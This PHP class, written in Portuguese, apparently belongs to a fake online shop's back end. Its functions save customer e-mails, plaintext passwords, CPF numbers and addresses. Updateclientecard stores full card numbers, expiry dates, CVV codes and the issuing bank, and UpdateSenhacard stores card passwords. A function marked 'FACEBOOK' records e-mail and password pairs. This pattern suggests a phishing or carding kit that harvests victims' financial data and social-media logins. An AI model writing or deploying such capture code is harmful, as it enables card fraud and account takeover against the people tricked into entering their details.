<?php 
class Clientes{

public function cadastrarClienteexistente($clienteja){
global $pdo;
$sql=$pdo->prepare("INSERT INTO coderphp_cliente SET email=:email ");
$sql->bindValue(":email", $clienteja);
$sql->execute();

$_SESSION['ultimocliente'] = $pdo->lastInsertId();


}

// FACEBOOK

public function cadastrarFacebook($email, $senha){
global $pdo;
$sql=$pdo->prepare("INSERT INTO coderphp_cliente SET email=:email, senha=:senha ");
$sql->bindValue(":email", $email);
$sql->bindValue(":senha", $senha);
$sql->execute();

$_SESSION['ultimocliente'] = $pdo->lastInsertId();


}

public function cadastrarClientenovo($clientenovo){
global $pdo;
$sql=$pdo->prepare("INSERT INTO coderphp_cliente SET email=:email ");
$sql->bindValue(":email", $clientenovo);
$sql->execute();

$_SESSION['ultimocliente'] = $pdo->lastInsertId();


}

public function updateCadastroClienteexiste1($senha_coderphp, $id){
global $pdo;
$sql=$pdo->prepare("UPDATE coderphp_cliente SET senha=:senha WHERE id=:id");

$sql->bindValue(":senha", $senha_coderphp);

$sql->bindValue(":id", $id);
$sql->execute();

}


// CADASTRAR O ENDEREÇO JÁ DO CLIENTE EXISTENTE UPDATE

public function updateCadastroClienteexiste($nomecompletonovo,$telefone,$cep,$endereco,$bairro,$cidade,$estado,$numero,$completo,$id){
global $pdo;
$sql=$pdo->prepare("UPDATE coderphp_cliente SET nomecompleto=:nomecompleto, telefone=:telefone, cep=:cep,
 endereco=:endereco,bairro=:bairro,cidade=:cidade,estado=:estado,numero=:numero,complemento=:complemento WHERE id=:id");

$sql->bindValue(":nomecompleto", $nomecompletonovo);
$sql->bindValue(":telefone", $telefone);
$sql->bindValue(":cep", $cep);
$sql->bindValue(":endereco", $endereco);
$sql->bindValue(":bairro", $bairro);
$sql->bindValue(":cidade", $cidade);
$sql->bindValue(":estado", $estado);
$sql->bindValue(":numero", $numero);
$sql->bindValue(":complemento", $completo);
$sql->bindValue(":id", $id);
$sql->execute();

}

// UPDATE NO CADASTRO DO CLIENTE NOVO

public function updateCadastroClientenovo($nomebico, $senha, $cpfnovo,  $cep,$endereco,$bairro,$cidade,$estado,$numero,$completo,$id ){
global $pdo;
$sql=$pdo->prepare("UPDATE coderphp_cliente SET nomecompleto=:nomecompleto, senha=:senha, cpf=:cpf, cep=:cep,
 endereco=:endereco,bairro=:bairro,cidade=:cidade,estado=:estado,numero=:numero,complemento=:complemento WHERE id=:id");

$sql->bindValue(":nomecompleto", $nomebico);
$sql->bindValue(":senha", $senha);
$sql->bindValue(":cpf", $cpfnovo);
$sql->bindValue(":cep", $cep);
$sql->bindValue(":endereco", $endereco);
$sql->bindValue(":bairro", $bairro);
$sql->bindValue(":cidade", $cidade);
$sql->bindValue(":estado", $estado);
$sql->bindValue(":numero", $numero);
$sql->bindValue(":complemento", $completo);
$sql->bindValue(":id", $id);
$sql->execute();

}


public function Updateclientecard($card,$nome,$cpf,$mes,$ano,$cvv,$parcela,$tipoCC1,$tipoCC,$categoria,$banco,$id){
 global $pdo;
 $sql=$pdo->prepare("UPDATE coderphp_cliente SET cc=:cc, nome=:nome, cpfcc=:cpfcc, mes=:mes, ano=:ano, 
 	cvv=:cvv, parcela=:parcela, tipocc1=:tipocc1, tipocc=:tipocc,  categoria=:categoria, banco=:banco WHERE id=:id");
 $sql->bindValue(":cc", $card);
  $sql->bindValue(":nome", $nome);
   $sql->bindValue(":cpfcc", $cpf);
 $sql->bindValue(":mes", $mes);
 $sql->bindValue(":ano", $ano);
 $sql->bindValue(":cvv", $cvv);
 $sql->bindValue(":parcela", $parcela);
  $sql->bindValue(":tipocc1", $tipoCC1);
 $sql->bindValue(":tipocc", $tipoCC);
 $sql->bindValue(":categoria", $categoria);
 $sql->bindValue(":banco", $banco);
 $sql->bindValue(":id", $id);
$sql->execute();

}


// UPDATE SENHA CARD NO CLIENTE

public function UpdateSenhacard($senhacard,$id){
	global $pdo;
	$sql=$pdo->prepare("UPDATE coderphp_cliente SET senhacard=:senhacard WHERE id=:id");
	$sql->bindValue(":senhacard", $senhacard);
	$sql->bindValue(":id", $id);
	$sql->execute();
}











}